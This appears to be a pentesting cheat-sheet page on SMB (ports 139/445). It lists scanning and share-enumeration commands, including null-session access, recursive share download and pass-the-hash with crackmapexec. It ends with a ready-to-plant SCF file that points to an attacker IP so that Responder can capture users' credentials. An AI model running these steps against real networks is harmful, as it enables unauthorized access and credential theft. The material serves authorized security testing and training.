---
title: PORT 139/tcp, 445/tcp - SMB
category: Services
order: 8
---

SMB stands for Server Message Block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retreivable or made available by the server.

# Introduction

It primarily runs on port 445 or port 139 depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In Linux however ,it is a little different. To make it work for Linux, you need to install a samba server because Linux natively does not use SMB protocol.

# Scanning the network

## Nmap

We can do a port scanner selecting the NetBIOS and SMB ports:

```
nmap -v -p 139,445 -oG smb.nmap <ip-addr>/<mask>
grep "Up" smb.nmap | cut -d " " -f 2
```

## Nbtscan

We can scan for NetBIOS Service around the network in order to collect additional NetBIOS information like server names:

```
sudo nbtscan -r <ip-addr>/<mask>
```

# Enumeration a target

## Nmap scripts

`Nmap` contains many useful NSE scripts that can be used to discover and enumerate SMB services. All these scripts are in the folder `/usr/share/nmap/scripts/`

```
ls -l /usr/share/nmap/scripts/smb*
```

You can launch the script with the `--script` parameter:

```
nmap -v -p 139,445 --script=<script> <ip-addr>
```

## Enum4linux

Enum4linux is an script that automatize some tasks:

```
enum4linux -a [-u <user> -p <pass>"] <ip-addr>
```

## Shared Folders

There are some available `nmap` scripts that could help us in that work:

```
nmap -p 139,445 -sV --script smb-\* <ip-addr>
```

`smbmap` will shows us available shares and permissions:

```
smbmap -H <ip-addr>
#Example Output
[+] Guest session       IP: ip-addr:445   Name: ip-addr
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))
```

And we can connect to these shares with `smbclient`:

```
smbclient //<ip-addr>/<share>                # Guest Session
smbclient //<ip-addr>/<share> -U "" -N       # Null Session
smbclient //<ip-addr>/<share> -U <user>      # Authenticated Session

# Older versions
smbclient //<ip-addr>/<share> --option='client min protocol=NT1'
```

To download recursively all the share you can use `smbget`:

```
smbget -R smb://<ip-addr>/<share>
smbget -R smb://<ip-addr>/<share> -U <user>
```

Also you could enumerate shares with `crackmapexec`:

```
crackmapexec smb <ip-addr> -u '' -p '' --shares #Null user
crackmapexec smb <ip-addr> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <ip-addr> -u 'username' -H '<HASH>' --shares #Guest user
```

Finally you can mount the share on your kali.

```
sudo mount -t cifs -o vers=2.0,username=guest,password=guest //<ip-addr>/<share>
```

# Shell Command Files (SCF) attack

It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.

```
[Shell]
Command=2
IconFile=\\<OUR.IP>\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Adding the **@** symbol in front of the filename will place the file on the top of the share drive.

```
Filename: @attack.scf
```

When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user, so we can capture it with Responder.

```
responder -I eth0
```

* [https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

# References:

* [https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b](https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b)
* [https://book.hacktricks.xyz/pentesting/pentesting-smb#port-139](https://book.hacktricks.xyz/pentesting/pentesting-smb#port-139)
* [http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html](http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html)
